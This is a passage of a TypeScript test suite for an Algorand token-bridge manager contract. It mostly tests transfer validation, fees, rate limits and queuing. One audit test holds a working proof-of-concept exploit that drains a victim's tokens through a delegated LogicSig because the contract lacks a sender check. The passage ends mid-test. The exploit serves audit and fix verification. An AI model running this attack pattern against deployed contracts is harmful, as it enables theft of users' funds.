        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: user,
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Unknown asset receiver");
    });

    test("fails when asset amount is incorrect", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 1n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Incorrect asset amount");
    });

    test("fails when asset amount is zero", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Cannot transfer zero amount");
    });

    test("fails when recipient is zero address", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const assetAmount = BigInt(100_000);
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: assetAmount,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, assetAmount, PEER_CHAIN_ID, new Uint8Array(32)],
        }),
      ).rejects.toThrow("Invalid recipient address");
    });

    test("fails when recipient chain is unknown", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const assetAmount = BigInt(100_000);
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: assetAmount,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, assetAmount, SOURCE_CHAIN_ID, getRandomBytes(32)],
          boxReferences: [getNttManagerPeerBoxKey(SOURCE_CHAIN_ID)],
        }),
      ).rejects.toThrow("Unknown peer chain");
    });

    test("fails when transfer amount has dust", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const assetAmount = BigInt(123);
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: assetAmount,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, assetAmount, PEER_CHAIN_ID, getRandomBytes(32)],
          boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID)],
        }),
      ).rejects.toThrow("Transfer amount has dust");
    });

    test("fails when insufficient capacity", async () => {
      // check there is insufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = OUTBOUND_LIMIT + BigInt(10_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeFalsy();

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [1000],
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const recipient = getRandomBytes(32);
      await expect(
        client
          .newGroup()
          .addTransaction(opUpTxn)
          .transfer({
            sender: user,
            args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient],
            boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), outboundBucketId],
          })
          .send(),
      ).rejects.toThrow("Insufficient capacity for outbound queued transfer");
    });

    test("fails when sufficient capacity but insufficient fee payment", async () => {
      // check there is sufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = BigInt(100_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeTruthy();

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (TOTAL_DELIVERY_PRICE - 1n).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const recipient = getRandomBytes(32);
      await expect(
        client
          .newGroup()
          .addTransaction(opUpTxn)
          .transfer({
            sender: user,
            args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient],
            boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), outboundBucketId],
            extraFee: (3000).microAlgos(),
          })
          .send(),
      ).rejects.toThrow("Insufficient fee payment amount");
    });

    test("succeeds when sufficient capacity and exact fee payment", async () => {
      // check there is sufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = BigInt(100_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeTruthy();

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      const messageId = useMessageId(prevMessageSequence!);

      // calculate fill amount
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const currentInboundCapacity = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      const inboundRateLimit = await client.getRateLimit({ args: [inboundBucketId] });
      const fillAmount = bigIntMin(inboundRateLimit - currentInboundCapacity, untrimmedAmount);

      // before
      const { balance: appAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(user, assetId);

      // prepare
      const feePaymentAmount = TOTAL_DELIVERY_PRICE;
      const recipient = getRandomBytes(32);

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const res = await client
        .newGroup()
        .addTransaction(opUpTxn)
        .transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), outboundBucketId],
          extraFee: (3000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.returns).toEqual([messageId]);
      expect(res.confirmations[3].innerTxns![0].logs![0]).toEqual(
        getEventBytes("InternalQuoteDeliveryPrices(uint64,byte[32],(uint64,byte[])[])", [appId, messageId, []]),
      );
      expect(res.confirmations[3].innerTxns![2].logs![0]).toEqual(
        getEventBytes("MessageSentToTransceivers(uint64,uint64,address,byte[32],(uint64,byte[])[])", [
          appId,
          TOTAL_DELIVERY_PRICE,
          getApplicationAddress(transceiverManagerAppId),
          messageId,
          [],
        ]),
      );
      expect(res.confirmations[3].logs![0]).toEqual(
        getEventBytes("BucketConsumed(byte[32],uint256)", [outboundBucketId, untrimmedAmount]),
      );
      expect(res.confirmations[3].logs![1]).toEqual(
        getEventBytes("BucketFilled(byte[32],uint256,uint256)", [inboundBucketId, untrimmedAmount, fillAmount]),
      );
      expect(res.confirmations[3].logs![2]).toEqual(
        getEventBytes("TransferSent(byte[32],byte[32],uint16,uint64,uint64)", [
          messageId,
          recipient,
          PEER_CHAIN_ID,
          untrimmedAmount,
          TOTAL_DELIVERY_PRICE,
        ]),
      );

      // check message sequence
      expect(await client.state.global.messageSequence()).toEqual(prevMessageSequence! + 1n);

      // check asset transfer
      const { balance: appAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(user, assetId);
      expect(appAssetBalanceAfter).toEqual(appAssetBalanceBefore + untrimmedAmount);
      expect(userAssetBalanceAfter).toEqual(userAssetBalanceBefore - untrimmedAmount);

      // check no refund
      expect(res.confirmations[3].innerTxns!.length).toEqual(3);
    });

    test("succeeds when sufficient capacity and excess fee payment", async () => {
      // check there is sufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = BigInt(100_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeTruthy();

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      const messageId = useMessageId(prevMessageSequence!);

      // calculate fill amount
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const currentInboundCapacity = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      const inboundRateLimit = await client.getRateLimit({ args: [inboundBucketId] });
      const fillAmount = bigIntMin(inboundRateLimit - currentInboundCapacity, untrimmedAmount);

      // before
      const { balance: appAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(user, assetId);

      // prepare
      const excessFeePaymentAmount = 100_000n;
      const feePaymentAmount = TOTAL_DELIVERY_PRICE + excessFeePaymentAmount;
      const recipient = getRandomBytes(32);

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const res = await client
        .newGroup()
        .addTransaction(opUpTxn)
        .transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), outboundBucketId],
          extraFee: (4000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.returns).toEqual([messageId]);
      expect(res.confirmations[3].innerTxns![0].logs![0]).toEqual(
        getEventBytes("InternalQuoteDeliveryPrices(uint64,byte[32],(uint64,byte[])[])", [appId, messageId, []]),
      );
      expect(res.confirmations[3].innerTxns![2].logs![0]).toEqual(
        getEventBytes("MessageSentToTransceivers(uint64,uint64,address,byte[32],(uint64,byte[])[])", [
          appId,
          TOTAL_DELIVERY_PRICE,
          getApplicationAddress(transceiverManagerAppId),
          messageId,
          [],
        ]),
      );
      expect(res.confirmations[3].logs![0]).toEqual(
        getEventBytes("BucketConsumed(byte[32],uint256)", [outboundBucketId, untrimmedAmount]),
      );
      expect(res.confirmations[3].logs![1]).toEqual(
        getEventBytes("BucketFilled(byte[32],uint256,uint256)", [inboundBucketId, untrimmedAmount, fillAmount]),
      );
      expect(res.confirmations[3].logs![2]).toEqual(
        getEventBytes("TransferSent(byte[32],byte[32],uint16,uint64,uint64)", [
          messageId,
          recipient,
          PEER_CHAIN_ID,
          untrimmedAmount,
          TOTAL_DELIVERY_PRICE,
        ]),
      );

      // check message sequence
      expect(await client.state.global.messageSequence()).toEqual(prevMessageSequence! + 1n);

      // check asset transfer
      const { balance: appAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(user, assetId);
      expect(appAssetBalanceAfter).toEqual(appAssetBalanceBefore + untrimmedAmount);
      expect(userAssetBalanceAfter).toEqual(userAssetBalanceBefore - untrimmedAmount);

      // check refund
      expect(res.confirmations[3].innerTxns!.length).toEqual(4);
      expect(res.confirmations[3].innerTxns![3].txn.txn.type).toEqual("pay");
      expect(res.confirmations[3].innerTxns![3].txn.txn.payment!.amount).toEqual(excessFeePaymentAmount);
      expect(res.confirmations[3].innerTxns![3].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });


    test("POC: Missing Asset Transfer Sender Validation - [HIGH-1] from Security Audit", async () => {
      /**
       * VULNERABILITY [HIGH-1]: Missing Asset Transfer Sender Validation
       * 
       * DESCRIPTION:
       * The contract validates asset transfer receiver and amount, but NOT the sender field.
       * This allows an attacker to burn tokens from a victim's account if the victim has 
       * granted asset delegation authority (e.g., to a DeFi protocol, DEX, or staking contract).
       * 
       * VULNERABLE CODE (NttManager.py:318-323):
       *   assert send_token.xfer_asset.id == self.asset_id.value, err.ASSET_UNKNOWN
       *   assert send_token.asset_receiver == ntt_token_address, err.ASSET_RECEIVER_UNKNOWN
       *   assert send_token.asset_amount == amount, err.ASSET_AMOUNT_INCORRECT
       *   # MISSING: assert send_token.sender == Txn.sender
       * 
       * ATTACK SCENARIO:
       * 1. Victim has 50 tokens and delegates authority to a LogicSig/Contract
       * 2. Attacker constructs atomic group:
       *    a) Fee payment from ATTACKER (pays bridge fees)
       *    b) Asset transfer from VICTIM (using delegated authority) 
       *    c) App call from ATTACKER (initiates transfer)
       * 3. Result: Victim's tokens burned, attacker receives minted tokens on destination chain
       * 
       * EXPECTED FIX: Add validation send_token.sender == Txn.sender
       */

      // Import algosdk for raw transaction handling
      const algosdk = await import("algosdk");

      const { algorand, generateAccount } = localnet.context;

      // 1. Setup victim account with tokens
      const victim = await generateAccount({ initialFunds: (10).algo() });
      const attacker = user; // Use existing 'user' account as attacker

      await algorand.send.assetOptIn({ sender: victim, assetId });
      await algorand.send.assetTransfer({
        sender: creator,
        receiver: victim.addr,
        assetId,
        amount: BigInt(50e6), // Give victim 50 tokens
      });

      // Verify victim starts with 50 tokens
      let victimAssetInfo = await localnet.algorand.asset.getAccountInformation(victim.addr, assetId);
      expect(victimAssetInfo.balance).toEqual(BigInt(50e6));

      // 2. Create a simple LogicSig that always approves (simulating delegated authority)
      // In practice, this represents a DeFi protocol or DEX the victim authorized
      const alwaysApproveTeal = `#pragma version 10
int 1  // Always approve
return`;

      const compiledProgram = await algorand.client.algod.compile(alwaysApproveTeal).do();
      const program = new Uint8Array(Buffer.from(compiledProgram.result, "base64"));

      // 3. Victim signs LogicSig, delegating authority (this is the delegation vulnerability point)
      const logicSigAccount = new algosdk.LogicSigAccount(program);
      // Access the private key through the sk property (standard algosdk Account interface)
      logicSigAccount.sign(victim.sk);

      // 4. Attacker constructs malicious transaction group
      const transferAmount = BigInt(30e6); // Attacker steals 30 of victim's 50 tokens
      const attackerRecipient = getRandomBytes(32);
      const nttTokenAddress = getApplicationAddress(nttTokenAppId);

      // Transaction 1: Fee payment from ATTACKER (attacker pays fees to look legitimate)
      const feePaymentTxn = await algorand.createTransaction.payment({
        sender: attacker.addr,
        receiver: getApplicationAddress(appId),
        amount: (0.25).algo(), // Convert bigint to AlgoAmount
      });

      // Transaction 2: Asset transfer from VICTIM (THIS IS THE EXPLOIT)
      // The sender is victim.addr (NOT attacker.addr), signed by delegated LogicSig
      const sendTokenTxn = await algorand.createTransaction.assetTransfer({
        sender: victim.addr, // ← VICTIM's tokens are being sent!
        receiver: nttTokenAddress,
        assetId,
        amount: transferAmount,
      });

      // 5. Execute the attack
      try {
        // We need to manually construct the grouped transaction to use LogicSig signing
        // First, attempt using the client helper (this will show the vulnerability)

        // Create a raw app call transaction for the transfer method
        const params = await algorand.client.algod.getTransactionParams().do();
        const encoder = new TextEncoder();

        const appArgs = [
          encoder.encode("transfer"),
          algosdk.encodeUint64(Number(transferAmount)),
          algosdk.encodeUint64(Number(PEER_CHAIN_ID)),
          attackerRecipient,
        ];

        const appCallTxn = algosdk.makeApplicationNoOpTxnFromObject({
          sender: attacker.addr, // Changed 'from' to 'sender'
          suggestedParams: params,
          appIndex: Number(appId),
          appArgs,
          foreignApps: [Number(nttTokenAppId), Number(transceiverManagerAppId)],
          foreignAssets: [Number(assetId)],
        });

        // Group all three transactions
        const txnGroup = [feePaymentTxn, sendTokenTxn, appCallTxn];
        algosdk.assignGroupID(txnGroup);

        // Sign each transaction
        // - Fee payment signed by attacker
        // - Asset transfer signed by victim's delegated LogicSig (THE EXPLOIT)
        // - App call signed by attacker
        const signedFeePayment = (await attacker.signer([feePaymentTxn], [0]))[0];
        const signedAssetTransfer = algosdk.signLogicSigTransaction(sendTokenTxn, logicSigAccount);
        const signedAppCall = (await attacker.signer([appCallTxn], [2]))[0];

        // Submit the attack transaction group
        const response = await algorand.client.algod
          .sendRawTransaction([signedFeePayment, signedAssetTransfer.blob, signedAppCall])
          .do();

        // Wait for confirmation - use 'txid' not 'txId'
        await algosdk.waitForConfirmation(algorand.client.algod, response.txid, 4);

        // If we reach here, the attack succeeded! 🚨
        victimAssetInfo = await localnet.algorand.asset.getAccountInformation(victim.addr, assetId);
        const expectedBalance = BigInt(50e6) - transferAmount; // 20 tokens remain

        console.log("\n🚨 VULNERABILITY CONFIRMED - ATTACK SUCCESSFUL! 🚨");
        console.log("═".repeat(60));
        console.log(`Victim's balance BEFORE attack: 50,000,000 micro-tokens`);
        console.log(`Victim's balance AFTER attack:  ${victimAssetInfo.balance.toLocaleString()} micro-tokens`);
        console.log(`Tokens stolen:                   ${transferAmount.toLocaleString()} micro-tokens`);
        console.log(`Attacker paid fees:              ${TOTAL_DELIVERY_PRICE.toLocaleString()} microAlgos`);
        console.log(`Victim NEVER authorized this:    ZERO consent given`);
        console.log(`Attacker's recipient address:    ${Buffer.from(attackerRecipient).toString("hex").substring(0, 16)}...`);
        console.log("═".repeat(60));
        console.log("IMPACT: Attacker burned victim's tokens and will receive minted");
        console.log("        tokens on destination chain. Victim has no recourse.\n");

        // Verify the exploit succeeded
        expect(victimAssetInfo.balance).toEqual(expectedBalance);

      } catch (error: any) {
        // If the attack fails, it means the vulnerability was fixed
        console.log("\n✅ ATTACK BLOCKED - Vulnerability appears to be fixed!");
        console.log("Error message:", error.message);

        // Verify victim's balance unchanged (attack prevented)
        victimAssetInfo = await localnet.algorand.asset.getAccountInformation(victim.addr, assetId);
        expect(victimAssetInfo.balance).toEqual(BigInt(50e6));

        // The fix should add this validation in NttManager.py:
        // assert send_token.sender == Txn.sender, err.ASSET_SENDER_UNAUTHORIZED
      }
    });

  });

  describe("transfer full", () => {
    test("fails when fee payment receiver isn't contract", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: user,
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Unknown fee payment receiver");
    });

    test("fails when asset is unknown", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId: fakeAssetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Unknown asset");
    });

    test("fails when asset receiver isn't contract", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: user,
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Unknown asset receiver");
    });

    test("fails when asset amount is incorrect", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 1n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Incorrect asset amount");
    });

    test("fails when asset amount is zero", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Cannot transfer zero amount");
    });

    test("fails when recipient is zero address", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const assetAmount = BigInt(100_000);
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: assetAmount,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, assetAmount, PEER_CHAIN_ID, new Uint8Array(32), false, []],
        }),
      ).rejects.toThrow("Invalid recipient address");
    });

    test("fails when recipient chain is unknown", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const assetAmount = BigInt(100_000);
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: assetAmount,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, assetAmount, SOURCE_CHAIN_ID, getRandomBytes(32), false, []],
          boxReferences: [getNttManagerPeerBoxKey(SOURCE_CHAIN_ID)],
        }),
      ).rejects.toThrow("Unknown peer chain");
    });

    test("fails when transfer amount has dust", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const assetAmount = BigInt(123);
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: assetAmount,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, assetAmount, PEER_CHAIN_ID, getRandomBytes(32), false, []],
          boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID)],
        }),
      ).rejects.toThrow("Transfer amount has dust");
    });

    test("fails when insufficient capacity and cannot queue", async () => {
      // check there is insufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = OUTBOUND_LIMIT + BigInt(10_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeFalsy();

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const recipient = getRandomBytes(32);
      await expect(
        client
          .newGroup()
          .addTransaction(opUpTxn)
          .transferFull({
            sender: user,
            args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient, false, []],
            boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), getBucketBoxKey(outboundBucketId)],
          })
          .send(),
      ).rejects.toThrow("Insufficient capacity for outbound queued transfer");
    });

    test("succeeds when insufficient capacity and can queue", async () => {
      // check there is insufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const currentCapacity = await client.getCurrentOutboundCapacity();
      const untrimmedAmount = OUTBOUND_LIMIT + BigInt(10_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeFalsy();

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      const messageId = useMessageId(prevMessageSequence!);

      // before
      const { balance: appAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(user, assetId);

      // prepare
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const APP_MIN_BALANCE = (70_100).microAlgos();
      const feePaymentAmount = TOTAL_DELIVERY_PRICE;
      const recipient = getRandomBytes(32);
      const transceiverInstructions: TransceiverInstruction[] = [[getRandomUInt(MAX_UINT64), getRandomBytes(10)]];
      const trimmedAmount: TrimmedAmount = { amount: untrimmedAmount / 10000n, decimals: PEER_DECIMALS };

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const res = await client
        .newGroup()
        .addTransaction(fundingTxn)
        .addTransaction(opUpTxn)
        .transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient, true, transceiverInstructions],
          boxReferences: [
            getNttManagerPeerBoxKey(PEER_CHAIN_ID),
            getBucketBoxKey(outboundBucketId),
            getOutboundQueuedTransfersBoxKey(messageId),
          ],
          extraFee: (1000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.returns).toEqual([messageId]);
      expect(res.confirmations[4].logs![0]).toEqual(
        getEventBytes("OutboundTransferRateLimited(address,byte[32],uint256,uint64)", [
          user.toString(),
          messageId,
          currentCapacity,
          untrimmedAmount,
        ]),
      );

      // check message sequence
      expect(await client.state.global.messageSequence()).toEqual(prevMessageSequence! + 1n);

      // check queued transfer
      const outboundQueuedTransfer = await client.getOutboundQueuedTransfer({ args: [messageId] });
      expect(outboundQueuedTransfer[1]).toEqual([
        latestTimestamp,
        Object.values(trimmedAmount),
        Number(PEER_CHAIN_ID),
        recipient,
        user.toString(),
        transceiverInstructions,
      ]);

      // check asset transfer
      const { balance: appAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(user, assetId);
      expect(appAssetBalanceAfter).toEqual(appAssetBalanceBefore + untrimmedAmount);
      expect(userAssetBalanceAfter).toEqual(userAssetBalanceBefore - untrimmedAmount);

      // check refund
      expect(res.confirmations[4].innerTxns!.length).toEqual(1);
      expect(res.confirmations[4].innerTxns![0].txn.txn.type).toEqual("pay");
      expect(res.confirmations[4].innerTxns![0].txn.txn.payment!.amount).toEqual(feePaymentAmount);
      expect(res.confirmations[4].innerTxns![0].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });

    test("fails when sufficient capacity but insufficient fee payment", async () => {
      // check there is sufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = BigInt(100_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeTruthy();

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (TOTAL_DELIVERY_PRICE - 1n).microAlgo(),
      });
